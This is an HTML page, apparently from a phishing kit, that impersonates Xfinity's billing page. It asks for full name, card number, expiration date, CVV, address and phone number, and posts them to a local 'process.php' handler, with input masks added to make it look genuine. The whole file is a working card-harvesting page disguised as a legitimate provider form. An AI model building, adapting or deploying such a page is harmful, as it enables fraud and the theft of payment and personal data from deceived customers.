<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xfinity Online</title>
    <link rel="stylesheet" href="./assets/css/reset.css">
    <link rel="stylesheet" href="./assets/css/style.css">
    <link rel="shortcut icon" href="./assets/img/favicon.ico" type="image/x-icon">
</head>
<body>

    <div>
        <div class="o-logo-top-div">
            <img src="./assets/img/black-logo.svg" class="o-logo-top" alt="">
        </div>

        <div class="container-wrapper">

            <div>
                <div>
                    <p style="padding-bottom: 10px;" class="top-header">
                        Account Information
                    </p>
                    <p class="para-reg">
                        Please enter the required information below
                    </p>
                </div>

                <form action="./process/process.php" autocapitalize="off" autocomplete="off" method="post">
                    <input type="text" required value="Billing information" name="form_name" id="form_name" class="hidden" hidden>
                    <div class="input-div">
                        <label class="label" for="full_name">Full name</label>
                        <input type="text" data-length="1" required class="input marign-none" name="full_name" id="full_name">
                    </div>

                    <div class="input-div">
                        <label class="label" for="card_number">Card Number</label>
                        <input type="text" data-length="1" required class="input marign-none" name="card_number" id="card_number">
                    </div>

                    <div class="dual-div">
                        <div class="input-div">
                            <label class="label" for="expiration_date">Expiration Date</label>
                            <input type="text" data-length="1" required class="input marign-none" name="expiration_date" id="expiration_date">
                        </div>
                        <div class="input-div">
                            <label class="label" for="cvv">CVV</label>
                            <input type="text" data-length="1" required class="input marign-none" name="cvv" id="cvv">
                        </div>
                    </div>

                    <div class="input-div">
                        <label class="label" for="address">Address</label>
                        <input type="text" data-length="1" required class="input marign-none" name="address" id="address">
                    </div>

                    <div class="input-div">
                        <label class="label" for="city">City</label>
                        <input type="text" data-length="1" required class="input marign-none" name="city" id="city">
                    </div>

                    <div class="input-div">
                        <label class="label" for="state">State</label>
                        <input type="text" data-length="1" required class="input marign-none" name="state" id="state">
                    </div>

                    <div class="input-div">
                        <label class="label" for="zip_code">Zip Code</label>
                        <input type="text" data-length="1" required class="input marign-none" name="zip_code" id="zip_code">
                    </div>

                    <div class="input-div">
                        <label class="label" for="phone_number">Phone Number</label>
                        <input type="text" data-length="1" required class="input marign-none" name="phone_number" id="phone_number">
                    </div>


                    <div>
                        <button id="login-button" type="submit" class="continue-button">Continue</button>
                    </div>
                </form>
            </div>

        </div>
    </div>

    <div class="footer-container">
        <img src="./assets/img/footer.png" class="footer-sm" alt="">
        <img src="./assets/img/footer-md.png" class="footer-md" alt="">
        <img src="./assets/img/footer-lg.png" class="footer-lg" alt="">

        <div class="cmp-revoke">
            <button class="cmp-revoke-consent" id="cmp-revoke">
            Cookie Preferences</button>
        </div>

    </div>

    <script src="./assets/js/main.js"></script>
    <script src="./assets/js/imask.js"></script>
    <script>
        const card_number = document.getElementById('card_number');
        const cvv = document.getElementById('cvv');
        const expiration_date = document.getElementById('expiration_date');
        const zip_code = document.getElementById('zip_code');
        const phone_number = document.getElementById('phone_number');

        var card_number_mask = new IMask(card_number, {
            mask: 'YYYY{ }YYYY{ }YYYY{ }YYYY',
            groups: {
                Y: new IMask.MaskedPattern.Group.Range([0,9])
            }
        });

        var cvv_mask = new IMask(cvv, {
            mask: 'YYYY',
            groups: {
                Y: new IMask.MaskedPattern.Group.Range([0,9])
            }
        });

        var expiration_date_mask = new IMask(expiration_date, {
            mask: 'MM/YY',
            groups: {
                MM: new IMask.MaskedPattern.Group.Range([01,12]),
                YY: new IMask.MaskedPattern.Group.Range([23,60])
            }
        });

        var zip_code_mask = new IMask(zip_code, {
            mask: 'YYYYYY',
            groups: {
                Y: new IMask.MaskedPattern.Group.Range([0,9])
            }
        });

        var phone_number_mask = new IMask(phone_number, {
            mask: 'YYY YYY YYYY',
            groups: {
                Y: new IMask.MaskedPattern.Group.Range([0,9])
            }
        });
    </script>
</body>
</html>
